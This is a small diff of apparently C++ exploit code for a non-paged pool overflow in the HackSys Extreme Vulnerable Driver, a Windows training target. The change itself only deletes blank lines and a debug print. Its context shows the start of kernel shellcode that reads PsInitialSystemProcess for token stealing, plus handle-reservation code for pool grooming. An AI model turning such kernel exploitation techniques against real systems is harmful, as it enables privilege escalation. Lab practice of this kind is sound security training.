@@ -121,12 +121,6 @@ static auto NtkrnlpaBase() -> LPVOID {
 	return NULL;
 }
 
-
-
-
-
-
-
 static auto ShellCode() -> void {
 
 	auto systemEProcess = *(void**)PsInitialSystemProcess;
@@ -166,7 +160,6 @@ public:
 	NonPagedPoolOverflow() : hHandle{ getDeviceHandle() }, data{ nullptr }, kernel_base{ nullptr } {
 		hEventsA.reserve(HACKSYS_EVD_POOL_HANDLE_SIZE);
 		hEventsB.reserve(HACKSYS_EVD_POOL_HANDLE_SIZE);
-		std::cout << "********\n";
 	}
 
 	~NonPagedPoolOverflow() {
